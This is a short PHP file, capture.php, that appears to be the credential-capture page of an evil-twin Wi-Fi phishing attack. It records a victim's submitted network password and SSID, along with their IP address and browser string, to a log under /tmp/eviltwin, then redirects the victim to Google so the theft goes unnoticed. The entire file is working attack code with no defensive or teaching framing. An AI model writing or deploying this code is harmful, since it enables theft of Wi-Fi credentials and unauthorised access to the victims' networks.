<?php
// capture.php — logs submitted PSK to /tmp/eviltwin/creds.log, then redirects.
$log = '/tmp/eviltwin/creds.log';
$ip  = $_SERVER['REMOTE_ADDR'] ?? '?';
$ua  = $_SERVER['HTTP_USER_AGENT'] ?? '?';
$ssid = $_POST['ssid'] ?? '';
$pw   = $_POST['password'] ?? '';
if ($pw !== '') {
    $line = sprintf("%s\t%s\t%s\t%s\t%s\n", date('c'), $ip, $ssid, $pw, $ua);
    file_put_contents($log, $line, FILE_APPEND | LOCK_EX);
}
header('Location: https://www.google.com');
exit;
